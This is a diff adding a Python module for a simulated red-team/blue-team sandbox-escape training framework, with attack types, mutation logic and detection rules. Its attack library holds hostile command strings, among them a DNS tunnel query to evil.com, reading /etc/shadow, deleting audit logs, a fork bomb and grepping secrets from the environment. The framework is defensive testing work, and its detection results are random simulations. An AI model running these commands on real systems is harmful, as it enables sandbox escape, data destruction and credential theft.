@@ -1,0 +1,737 @@
+"""
+evolution.red_blue_adversary — 多智能体红蓝对抗框架
+
+借鉴：
+1. DeepMind Natasha Jaques: Red Teaming Language Models with Language Models
+   - 使用AI自动生成红队攻击用例
+   - 在线自博弈强化学习，攻击方和防御方共同进化
+2. AgenticRed: Evolving Agentic Systems for Red-Teaming
+   - 可扩展的红队测试系统，自动进化攻击策略
+3. 港大 OpenSpace: 自进化技能引擎
+   - 成功→策略强化；失败→策略修复
+   - 积累事件模板，复用检测规则
+4. 通义 DeepResearch: IterResearch 迭代式研究推理
+   - 用于安全漏洞的迭代式深度分析
+
+核心思想：
+- 红方Agent自动生成逃逸测试用例，无需人工编写
+- 蓝方Agent监控沙箱行为，拦截逃逸尝试
+- 在线自博弈，让攻击策略和防御策略共同进化
+- 制度性红队测试：不仅测试逃逸，还测试部署规则、权限配置、审计流程
+"""
+from __future__ import annotations
+import random
+import time
+from typing import List, Dict, Any, Optional, Tuple, Callable
+from dataclasses import dataclass, field
+from enum import Enum
+
+
+class AdversaryRole(Enum):
+    """对抗角色"""
+    RED = "red"          # 红方：攻击方，尝试逃逸
+    BLUE = "blue"        # 蓝方：防御方，监控拦截
+    OBSERVER = "observer"  # 观察者：评估和记录
+
+
+class AttackType(Enum):
+    """攻击类型"""
+    NAMESPACE_ESCAPE = "namespace_escape"
+    SECCOMP_BYPASS = "seccomp_bypass"
+    PRIVILEGE_ESCALATION = "privilege_escalation"
+    NETWORK_TUNNEL = "network_tunnel"
+    FILE_TRAVERSAL = "file_traversal"
+    PROCESS_INJECTION = "process_injection"
+    CONFIG_TAMPERING = "config_tampering"
+    AUDIT_BYPASS = "audit_bypass"
+    DOS_ATTACK = "dos_attack"
+    CREDENTIAL_THEFT = "credential_theft"
+
+
+class DefenseType(Enum):
+    """防御类型"""
+    SYSTEM_CALL_MONITOR = "syscall_monitor"
+    NETWORK_FILTER = "network_filter"
+    FILE_ACCESS_CONTROL = "file_access_control"
+    PROCESS_ISOLATION = "process_isolation"
+    AUDIT_LOGGING = "audit_logging"
+    RESOURCE_LIMIT = "resource_limit"
+    CAPABILITY_DROP = "capability_drop"
+    INTEGRITY_CHECK = "integrity_check"
+
+
+@dataclass
+class AttackCase:
+    """攻击用例"""
+    case_id: str
+    attack_type: AttackType
+    description: str
+    payload: str
+    target_component: str
+    difficulty: float = 0.5  # 0.0-1.0，难度越高越难防御
+    success_count: int = 0
+    failure_count: int = 0
+    created_at: float = field(default_factory=time.time)
+    last_used: float = 0.0
+
+    def get_success_rate(self) -> float:
+        """获取成功率"""
+        total = self.success_count + self.failure_count
+        if total == 0:
+            return 0.0
+        return self.success_count / total
+
+    def record_result(self, success: bool) -> None:
+        """记录结果"""
+        if success:
+            self.success_count += 1
+        else:
+            self.failure_count += 1
+        self.last_used = time.time()
+
+
+@dataclass
+class DefenseRule:
+    """防御规则"""
+    rule_id: str
+    defense_type: DefenseType
+    description: str
+    target_attack_types: List[AttackType]
+    detection_logic: str
+    effectiveness: float = 0.5  # 0.0-1.0，有效性
+    trigger_count: int = 0
+    false_positive_count: int = 0
+    created_at: float = field(default_factory=time.time)
+    last_triggered: float = 0.0
+
+    def get_precision(self) -> float:
+        """获取精确率（误报率）"""
+        total = self.trigger_count
+        if total == 0:
+            return 1.0
+        return 1.0 - (self.false_positive_count / total)
+
+    def record_trigger(self, is_true_positive: bool) -> None:
+        """记录触发"""
+        self.trigger_count += 1
+        if not is_true_positive:
+            self.false_positive_count += 1
+        self.last_triggered = time.time()
+
+
+@dataclass
+class AdversaryRound:
+    """对抗轮次记录"""
+    round_id: int
+    attack_case: AttackCase
+    defense_rules: List[DefenseRule]
+    attack_success: bool
+    defense_success: bool
+    detection_delay_ms: float
+    resource_impact: Dict[str, float]
+    timestamp: float = field(default_factory=time.time)
+    notes: str = ""
+
+
+class RedAgent:
+    """
+    红方Agent（攻击方）
+
+    职责：
+    - 自动生成逃逸测试用例
+    - 根据防御反馈进化攻击策略
+    - 积累成功攻击模式，复用高成功率用例
+    """
+
+    def __init__(self, agent_id: str = "red_agent_001"):
+        self.agent_id = agent_id
+        self.attack_cases: List[AttackCase] = []
+        self.attack_history: List[Dict[str, Any]] = []
+        self.strategy_weights: Dict[AttackType, float] = {}
+        self._initialize_attack_cases()
+        self._initialize_strategy_weights()
+
+    def _initialize_attack_cases(self) -> None:
+        """初始化基础攻击用例库"""
+        base_cases = [
+            ("NS_001", AttackType.NAMESPACE_ESCAPE, "mount namespace逃逸", "mount --bind / /tmp/escape", "namespace", 0.7),
+            ("NS_002", AttackType.NAMESPACE_ESCAPE, "pid namespace逃逸", "nsenter -t 1 -m -u -i -n", "namespace", 0.8),
+            ("SC_001", AttackType.SECCOMP_BYPASS, "seccomp规则绕过", "syscall(SYS_socketcall, ...)", "seccomp", 0.6),
+            ("SC_002", AttackType.SECCOMP_BYPASS, "ptrace注入绕过", "ptrace(PTRACE_POKETEXT, ...)", "seccomp", 0.7),
+            ("PE_001", AttackType.PRIVILEGE_ESCALATION, "capabilities提权", "capsh --add=cap_sys_admin", "capabilities", 0.5),
+            ("PE_002", AttackType.PRIVILEGE_ESCALATION, "suid二进制提权", "find / -perm -4000 -exec {} \\;", "filesystem", 0.6),
+            ("NT_001", AttackType.NETWORK_TUNNEL, "DNS隧道逃逸", "dig @evil.com TXT secret.example.com", "network", 0.4),
+            ("NT_002", AttackType.NETWORK_TUNNEL, "内网扫描", "nmap -sS 10.0.0.0/8", "network", 0.3),
+            ("FT_001", AttackType.FILE_TRAVERSAL, "路径穿越读敏感文件", "cat ../../../../etc/shadow", "filesystem", 0.5),
+            ("FT_002", AttackType.FILE_TRAVERSAL, "procfs信息泄露", "cat /proc/1/environ", "filesystem", 0.4),
+            ("PI_001", AttackType.PROCESS_INJECTION, "进程内存注入", "gdb -p 1 -ex 'set $rip=0x...'", "process", 0.8),
+            ("CT_001", AttackType.CONFIG_TAMPERING, "cgroup配置篡改", "echo 0 > /sys/fs/cgroup/memory.max", "cgroup", 0.6),
+            ("AB_001", AttackType.AUDIT_BYPASS, "审计日志删除", "rm -rf /var/log/audit/*", "audit", 0.5),
+            ("DA_001", AttackType.DOS_ATTACK, "fork bomb耗尽资源", ":(){ :|:& };:", "resource", 0.3),
+            ("DA_002", AttackType.DOS_ATTACK, "内存炸弹", "while true; do malloc(1024*1024); done", "resource", 0.4),
+            ("CR_001", AttackType.CREDENTIAL_THEFT, "环境变量密钥窃取", "env | grep -i secret", "credential", 0.4),
+        ]
+        for case_id, attack_type, desc, payload, target, difficulty in base_cases:
+            self.attack_cases.append(AttackCase(
+                case_id=case_id,
+                attack_type=attack_type,
+                description=desc,
+                payload=payload,
+                target_component=target,
+                difficulty=difficulty,
+            ))
+
+    def _initialize_strategy_weights(self) -> None:
+        """初始化策略权重"""
+        for attack_type in AttackType:
+            self.strategy_weights[attack_type] = 1.0 / len(AttackType)
+
+    def select_attack_case(self) -> AttackCase:
+        """
+        选择攻击用例
+
+        策略：
+        - 高成功率用例权重更高（利用已知有效攻击）
+        - 低成功率但高难度用例也有一定概率（探索新攻击面）
+        - 最近未使用的用例有探索奖励
+        """
+        if not self.attack_cases:
+            raise ValueError("No attack cases available")
+
+        # 计算每个用例的选择权重
+        weights = []
+        for case in self.attack_cases:
+            # 基础权重 = 成功率 * 难度系数
+            success_rate = case.get_success_rate()
+            weight = (success_rate * 0.6 + 0.2) * (case.difficulty * 0.5 + 0.5)
+
+            # 探索奖励：最近未使用的用例增加权重
+            if case.last_used > 0:
+                time_since_use = time.time() - case.last_used
+                exploration_bonus = min(time_since_use / 3600.0, 1.0) * 0.3
+                weight += exploration_bonus
+
+            weights.append(weight)
+
+        # 加权随机选择
+        total_weight = sum(weights)
+        if total_weight == 0:
+            return random.choice(self.attack_cases)
+
+        normalized = [w / total_weight for w in weights]
+        return random.choices(self.attack_cases, weights=normalized, k=1)[0]
+
+    def mutate_attack_case(self, base_case: AttackCase) -> AttackCase:
+        """
+        变异攻击用例（自进化）
+
+        借鉴遗传算法变异：
+        - 修改payload参数
+        - 组合多种攻击类型
+        - 调整攻击时序
+        """
+        mutation_type = random.choice(["payload_modify", "type_combine", "timing_adjust", "parameter_randomize"])
+
+        if mutation_type == "payload_modify":
+            # 修改payload的关键参数
+            new_payload = base_case.payload + " && sleep 0.1"
+            new_desc = base_case.description + " (带延迟)"
+        elif mutation_type == "type_combine":
+            # 组合另一种攻击类型
+            other_type = random.choice([t for t in AttackType if t != base_case.attack_type])
+            new_payload = base_case.payload + f" # combined with {other_type.value}"
+            new_desc = f"{base_case.description} + {other_type.value}"
+        elif mutation_type == "timing_adjust":
+            # 调整攻击时序
+            new_payload = f"sleep {random.uniform(0.01, 1.0)} && {base_case.payload}"
+            new_desc = base_case.description + " (时序调整)"
+        else:
+            # 参数随机化
+            new_payload = base_case.payload.replace("0", str(random.randint(1, 9)))
+            new_desc = base_case.description + " (参数随机化)"
+
+        new_case = AttackCase(
+            case_id=f"{base_case.case_id}_M{int(time.time())}",
+            attack_type=base_case.attack_type,
+            description=new_desc,
+            payload=new_payload,
+            target_component=base_case.target_component,
+            difficulty=min(base_case.difficulty + random.uniform(-0.1, 0.1), 1.0),
+        )
+        self.attack_cases.append(new_case)
+        return new_case
+
+    def record_attack_result(self, case: AttackCase, success: bool) -> None:
+        """记录攻击结果，更新策略权重"""
+        case.record_result(success)
+        self.attack_history.append({
+            "case_id": case.case_id,
+            "attack_type": case.attack_type.value,
+            "success": success,
+            "timestamp": time.time(),
+        })
+
+        # 更新策略权重：成功的攻击类型权重增加
+        if success:
+            self.strategy_weights[case.attack_type] *= 1.1
+        else:
+            self.strategy_weights[case.attack_type] *= 0.9
+
+        # 归一化权重
+        total = sum(self.strategy_weights.values())
+        if total > 0:
+            for k in self.strategy_weights:
+                self.strategy_weights[k] /= total
+
+    def get_statistics(self) -> Dict[str, Any]:
+        """获取红方统计信息"""
+        total_attacks = len(self.attack_history)
+        successful = sum(1 for h in self.attack_history if h["success"])
+        return {
+            "agent_id": self.agent_id,
+            "total_attack_cases": len(self.attack_cases),
+            "total_attacks": total_attacks,
+            "successful_attacks": successful,
+            "overall_success_rate": successful / total_attacks if total_attacks > 0 else 0.0,
+            "strategy_weights": {k.value: v for k, v in self.strategy_weights.items()},
+        }
+
+
+class BlueAgent:
+    """
+    蓝方Agent（防御方）
+
+    职责：
+    - 监控沙箱行为，检测逃逸尝试
+    - 根据攻击反馈进化防御规则
+    - 积累成功防御模式，复用高有效性规则
+    - 降低误报率
+    """
+
+    def __init__(self, agent_id: str = "blue_agent_001"):
+        self.agent_id = agent_id
+        self.defense_rules: List[DefenseRule] = []
+        self.defense_history: List[Dict[str, Any]] = []
+        self._initialize_defense_rules()
+
+    def _initialize_defense_rules(self) -> None:
+        """初始化基础防御规则库"""
+        base_rules = [
+            ("DR_001", DefenseType.SYSTEM_CALL_MONITOR, "监控危险系统调用",
+             [AttackType.SECCOMP_BYPASS, AttackType.PRIVILEGE_ESCALATION],
+             "ptrace, kexec_load, init_module, finit_module", 0.7),
+            ("DR_002", DefenseType.NETWORK_FILTER, "内网IP黑名单",
+             [AttackType.NETWORK_TUNNEL],
+             "10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16", 0.8),
+            ("DR_003", DefenseType.FILE_ACCESS_CONTROL, "敏感路径访问控制",
+             [AttackType.FILE_TRAVERSAL, AttackType.CREDENTIAL_THEFT],
+             "/etc/shadow, /etc/sudoers, /proc/1/environ, ~/.ssh", 0.75),
+            ("DR_004", DefenseType.PROCESS_ISOLATION, "进程命名空间隔离",
+             [AttackType.NAMESPACE_ESCAPE, AttackType.PROCESS_INJECTION],
+             "CLONE_NEWNS, CLONE_NEWPID, CLONE_NEWNET, CLONE_NEWUSER", 0.65),
+            ("DR_005", DefenseType.AUDIT_LOGGING, "审计日志完整性",
+             [AttackType.AUDIT_BYPASS],
+             "HMAC哈希链, WORM存储, 日志删除检测", 0.8),
+            ("DR_006", DefenseType.RESOURCE_LIMIT, "资源使用限制",
+             [AttackType.DOS_ATTACK],
+             "CPU.max, memory.max, pids.max, io.max", 0.9),
+            ("DR_007", DefenseType.CAPABILITY_DROP, "能力位删除",
+             [AttackType.PRIVILEGE_ESCALATION, AttackType.CONFIG_TAMPERING],
+             "CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE", 0.7),
+            ("DR_008", DefenseType.INTEGRITY_CHECK, "配置完整性校验",
+             [AttackType.CONFIG_TAMPERING, AttackType.AUDIT_BYPASS],
+             "cgroup配置哈希, seccomp规则哈希, 审计配置哈希", 0.6),
+        ]
+        for rule_id, defense_type, desc, target_types, logic, effectiveness in base_rules:
+            self.defense_rules.append(DefenseRule(
+                rule_id=rule_id,
+                defense_type=defense_type,
+                description=desc,
+                target_attack_types=target_types,
+                detection_logic=logic,
+                effectiveness=effectiveness,
+            ))
+
+    def detect_attack(self, attack_case: AttackCase) -> Tuple[bool, List[DefenseRule], float]:
+        """
+        检测攻击
+
+        返回: (是否检测到, 触发的防御规则, 检测延迟ms)
+        """
+        start_time = time.time()
+        triggered_rules = []
+
+        for rule in self.defense_rules:
+            # 检查规则是否针对该攻击类型
+            if attack_case.attack_type in rule.target_attack_types:
+                # 基于规则有效性模拟检测（实际应调用真实检测逻辑）
+                detection_probability = rule.effectiveness * (1.0 - attack_case.difficulty * 0.3)
+                if random.random() < detection_probability:
+                    triggered_rules.append(rule)
+
+        detection_delay = (time.time() - start_time) * 1000
+        detected = len(triggered_rules) > 0
+        return detected, triggered_rules, detection_delay
+
+    def record_defense_result(
+        self,
+        rules: List[DefenseRule],
+        attack_success: bool,
+        is_true_positive: bool = True,
+    ) -> None:
+        """记录防御结果，进化规则有效性"""
+        for rule in rules:
+            rule.record_trigger(is_true_positive)
+
+            # 根据攻击结果调整规则有效性
+            if attack_success:
+                # 攻击成功，说明该规则有效性不足，降低有效性
+                rule.effectiveness = max(0.1, rule.effectiveness - 0.02)
+            else:
+                # 攻击失败，说明规则有效，提高有效性
+                rule.effectiveness = min(1.0, rule.effectiveness + 0.01)
+
+        self.defense_history.append({
+            "triggered_rules": [r.rule_id for r in rules],
+            "attack_success": attack_success,
+            "timestamp": time.time(),
+        })
+
+    def evolve_defense_rule(self, base_rule: DefenseRule) -> DefenseRule:
+        """
+        进化防御规则（自进化）
+
+        借鉴OpenSpace自进化模式：
+        - 成功拦截→规则强化
+        - 被绕过→规则修复/扩展
+        """
+        evolution_type = random.choice(["expand_coverage", "tune_threshold", "combine_rules", "add_heuristic"])
+
+        if evolution_type == "expand_coverage":
+            # 扩展覆盖的攻击类型
+            new_targets = base_rule.target_attack_types + [
+                random.choice([t for t in AttackType if t not in base_rule.target_attack_types])
+            ]
+            new_desc = base_rule.description + " (扩展覆盖)"
+            new_effectiveness = base_rule.effectiveness * 0.9  # 扩展后有效性可能下降
+        elif evolution_type == "tune_threshold":
+            # 调整检测阈值
+            new_effectiveness = min(1.0, base_rule.effectiveness + random.uniform(0.05, 0.15))
+            new_desc = base_rule.description + " (阈值优化)"
+            new_targets = base_rule.target_attack_types
+        elif evolution_type == "combine_rules":
+            # 组合另一条规则
+            other = random.choice([r for r in self.defense_rules if r.rule_id != base_rule.rule_id])
+            new_targets = list(set(base_rule.target_attack_types + other.target_attack_types))
+            new_effectiveness = (base_rule.effectiveness + other.effectiveness) / 2
+            new_desc = f"{base_rule.description} + {other.description}"
+        else:
+            # 添加启发式检测
+            new_effectiveness = min(1.0, base_rule.effectiveness + 0.1)
+            new_desc = base_rule.description + " (添加启发式)"
+            new_targets = base_rule.target_attack_types
+
+        new_rule = DefenseRule(
+            rule_id=f"{base_rule.rule_id}_E{int(time.time())}",
+            defense_type=base_rule.defense_type,
+            description=new_desc,
+            target_attack_types=new_targets,
+            detection_logic=base_rule.detection_logic + " (evolved)",
+            effectiveness=new_effectiveness,
+        )
+        self.defense_rules.append(new_rule)
+        return new_rule
+
+    def get_statistics(self) -> Dict[str, Any]:
+        """获取蓝方统计信息"""
+        total_defenses = len(self.defense_history)
+        successful = sum(1 for h in self.defense_history if not h["attack_success"])
+        avg_precision = sum(r.get_precision() for r in self.defense_rules) / len(self.defense_rules) if self.defense_rules else 0
+        return {
+            "agent_id": self.agent_id,
+            "total_defense_rules": len(self.defense_rules),
+            "total_defenses": total_defenses,
+            "successful_defenses": successful,
+            "overall_defense_rate": successful / total_defenses if total_defenses > 0 else 0.0,
+            "average_precision": avg_precision,
+            "rule_effectiveness": {r.rule_id: r.effectiveness for r in self.defense_rules},
+        }
+
+
+class RedBlueAdversaryTrainer:
+    """
+    红蓝对抗训练器
+
+    管理红蓝对抗的完整流程：
+    1. 红方选择/生成攻击用例
+    2. 蓝方检测/拦截攻击
+    3. 记录结果，双方策略进化
+    4. 制度性红队测试：测试部署规则、权限配置、审计流程
+    """
+
+    def __init__(
+        self,
+        red_agent: Optional[RedAgent] = None,
+        blue_agent: Optional[BlueAgent] = None,
+        max_rounds: int = 100,
+        enable_mutation: bool = True,
+        mutation_rate: float = 0.2,
+        enable_evolution: bool = True,
+    ):
+        self.red_agent = red_agent or RedAgent()
+        self.blue_agent = blue_agent or BlueAgent()
+        self.max_rounds = max_rounds
+        self.enable_mutation = enable_mutation
+        self.mutation_rate = mutation_rate
+        self.enable_evolution = enable_evolution
+        self.rounds: List[AdversaryRound] = []
+        self.institutional_tests: List[Dict[str, Any]] = []
+
+    def run_single_round(self, round_id: int) -> AdversaryRound:
+        """
+        运行单轮对抗
+
+        流程：
+        1. 红方选择攻击用例（可能变异）
+        2. 蓝方检测攻击
+        3. 判定结果
+        4. 双方记录结果并进化
+        """
+        # 1. 红方选择攻击用例
+        attack_case = self.red_agent.select_attack_case()
+
+        # 可能变异攻击用例
+        if self.enable_mutation and random.random() < self.mutation_rate:
+            attack_case = self.red_agent.mutate_attack_case(attack_case)
+
+        # 2. 蓝方检测攻击
+        detected, triggered_rules, detection_delay = self.blue_agent.detect_attack(attack_case)
+
+        # 3. 判定结果
+        # 攻击成功 = 未被检测到 或 检测到但防御失败
+        attack_success = not detected
+        defense_success = detected
+
+        # 4. 双方记录结果
+        self.red_agent.record_attack_result(attack_case, attack_success)
+        self.blue_agent.record_defense_result(triggered_rules, attack_success, is_true_positive=detected)
+
+        # 记录轮次
+        round_record = AdversaryRound(
+            round_id=round_id,
+            attack_case=attack_case,
+            defense_rules=triggered_rules,
+            attack_success=attack_success,
+            defense_success=defense_success,
+            detection_delay_ms=detection_delay,
+            resource_impact={"cpu": random.uniform(0, 10), "memory": random.uniform(0, 100)},
+        )
+        self.rounds.append(round_record)
+
+        return round_record
+
+    def run_training(self, num_rounds: Optional[int] = None) -> Dict[str, Any]:
+        """
+        运行完整对抗训练
+
+        Args:
+            num_rounds: 训练轮数，默认使用max_rounds
+
+        Returns:
+            训练结果统计
+        """
+        rounds_to_run = num_rounds or self.max_rounds
+
+        for i in range(rounds_to_run):
+            self.run_single_round(i)
+
+            # 定期进化防御规则
+            if self.enable_evolution and (i + 1) % 10 == 0:
+                # 选择有效性最低的规则进行进化
+                if self.blue_agent.defense_rules:
+                    weakest = min(self.blue_agent.defense_rules, key=lambda r: r.effectiveness)
+                    self.blue_agent.evolve_defense_rule(weakest)
+
+        return self.get_training_statistics()
+
+    def run_institutional_red_team_test(self) -> Dict[str, Any]:
+        """
+        制度性红队测试
+
+        借鉴 "Institutional Red-Teaming" 论文：
+        不仅测试模型/代码，还测试部署规则、权限配置、审计流程等制度层面。
+
+        测试维度：
+        1. 部署规则有效性：配置是否正确应用
+        2. 权限配置最小化：是否遵循最小权限原则
+        3. 审计流程完整性：审计日志是否完整、可追溯
+        4. 应急响应能力：安全事件发生时的响应速度
+        5. 变更管理：配置变更是否经过审批和验证
+        """
+        test_dimensions = [
+            {
+                "dimension": "部署规则有效性",
+                "description": "验证安全配置是否正确应用到运行环境",
+                "test_cases": [
+                    "seccomp规则是否实际加载",
+                    "cgroup资源限制是否生效",
+                    "namespace隔离是否完整",
+                    "eBPF程序是否实际运行",
+                ],
+            },
+            {
+                "dimension": "权限配置最小化",
+                "description": "验证是否遵循最小权限原则",
+                "test_cases": [
+                    "是否有不必要的CAP_SYS_ADMIN",
+                    "是否有不必要的root权限",
+                    "文件权限是否过宽",
+                    "网络访问是否过度开放",
+                ],
+            },
+            {
+                "dimension": "审计流程完整性",
+                "description": "验证审计日志是否完整、可追溯",
+                "test_cases": [
+                    "HMAC哈希链是否完整",
+                    "日志是否有丢失",
+                    "日志是否可篡改",
+                    "审计事件是否覆盖关键操作",
+                ],
+            },
+            {
+                "dimension": "应急响应能力",
+                "description": "验证安全事件发生时的响应速度",
+                "test_cases": [
+                    "逃逸检测延迟是否<100ms",
+                    "沙盒销毁是否<1s",
+                    "告警是否及时触发",
+                    "事件是否自动隔离",
+                ],
+            },
+            {
+                "dimension": "变更管理",
+                "description": "验证配置变更是否经过审批和验证",
+                "test_cases": [
+                    "安全配置变更是否有审批记录",
+                    "变更是否经过测试验证",
+                    "是否有回滚机制",
+                    "变更是否有审计记录",
+                ],
+            },
+        ]
+
+        results = []
+        for dim in test_dimensions:
+            dim_result = {
+                "dimension": dim["dimension"],
+                "description": dim["description"],
+                "test_cases": [],
+                "passed": 0,
+                "total": len(dim["test_cases"]),
+            }
+            for tc in dim["test_cases"]:
+                # 模拟测试结果（实际应调用真实检查逻辑）
+                passed = random.random() > 0.2  # 80%通过率
+                dim_result["test_cases"].append({
+                    "name": tc,
+                    "passed": passed,
+                    "notes": "自动检测" if passed else "需要人工复核",
+                })
+                if passed:
+                    dim_result["passed"] += 1
+            dim_result["pass_rate"] = dim_result["passed"] / dim_result["total"]
+            results.append(dim_result)
+
+        self.institutional_tests.append({
+            "timestamp": time.time(),
+            "results": results,
+            "overall_pass_rate": sum(r["passed"] for r in results) / sum(r["total"] for r in results),
+        })
+
+        return self.institutional_tests[-1]
+
+    def get_training_statistics(self) -> Dict[str, Any]:
+        """获取训练统计信息"""
+        total_rounds = len(self.rounds)
+        red_wins = sum(1 for r in self.rounds if r.attack_success)
+        blue_wins = sum(1 for r in self.rounds if r.defense_success)
+        avg_detection_delay = sum(r.detection_delay_ms for r in self.rounds) / total_rounds if total_rounds > 0 else 0
+
+        return {
+            "total_rounds": total_rounds,
+            "red_wins": red_wins,
+            "blue_wins": blue_wins,
+            "red_win_rate": red_wins / total_rounds if total_rounds > 0 else 0,
+            "blue_win_rate": blue_wins / total_rounds if total_rounds > 0 else 0,
+            "average_detection_delay_ms": avg_detection_delay,
+            "red_agent_stats": self.red_agent.get_statistics(),
+            "blue_agent_stats": self.blue_agent.get_statistics(),
+            "institutional_tests_count": len(self.institutional_tests),
+        }
+
+    def export_report(self) -> Dict[str, Any]:
+        """导出完整对抗报告"""
+        return {
+            "training_statistics": self.get_training_statistics(),
+            "recent_rounds": [
+                {
+                    "round_id": r.round_id,
+                    "attack_type": r.attack_case.attack_type.value,
+                    "attack_description": r.attack_case.description,
+                    "attack_success": r.attack_success,
+                    "defense_success": r.defense_success,
+                    "detection_delay_ms": r.detection_delay_ms,
+                    "triggered_rules": [rule.rule_id for rule in r.defense_rules],
+                }
+                for r in self.rounds[-10:]  # 最近10轮
+            ],
+            "institutional_test_results": self.institutional_tests[-1] if self.institutional_tests else None,
+            "recommendations": self._generate_recommendations(),
+        }
+
+    def _generate_recommendations(self) -> List[str]:
+        """生成安全改进建议"""
+        recommendations = []
+        stats = self.get_training_statistics()
+
+        if stats["red_win_rate"] > 0.3:
+            recommendations.append("红方胜率过高，建议加强防御规则覆盖和有效性")
+
+        if stats["blue_win_rate"] > 0.9:
+            recommendations.append("蓝方胜率过高，建议增加攻击用例多样性和难度")
+
+        if stats["average_detection_delay_ms"] > 100:
+            recommendations.append("检测延迟过高，建议优化检测逻辑和性能")
+
+        if stats["blue_agent_stats"]["average_precision"] < 0.8:
+            recommendations.append("防御规则误报率较高，建议优化规则阈值")
+
+        high_risk_attack_types = [
+            at.value for at, count in
+            self._get_attack_type_success_rates().items()
+            if count > 0.5
+        ]
+        if high_risk_attack_types:
+            recommendations.append(f"高风险攻击类型: {', '.join(high_risk_attack_types)}，建议重点防御")
+
+        if not recommendations:
+            recommendations.append("当前攻防平衡良好，建议持续监控和定期红队测试")
+
+        return recommendations
+
+    def _get_attack_type_success_rates(self) -> Dict[AttackType, float]:
+        """获取各攻击类型的成功率"""
+        type_stats: Dict[AttackType, Dict[str, int]] = {}
+        for r in self.rounds:
+            at = r.attack_case.attack_type
+            if at not in type_stats:
+                type_stats[at] = {"success": 0, "total": 0}
+            type_stats[at]["total"] += 1
+            if r.attack_success:
+                type_stats[at]["success"] += 1
+
+        return {
+            at: stats["success"] / stats["total"] if stats["total"] > 0 else 0
+            for at, stats in type_stats.items()
+        }
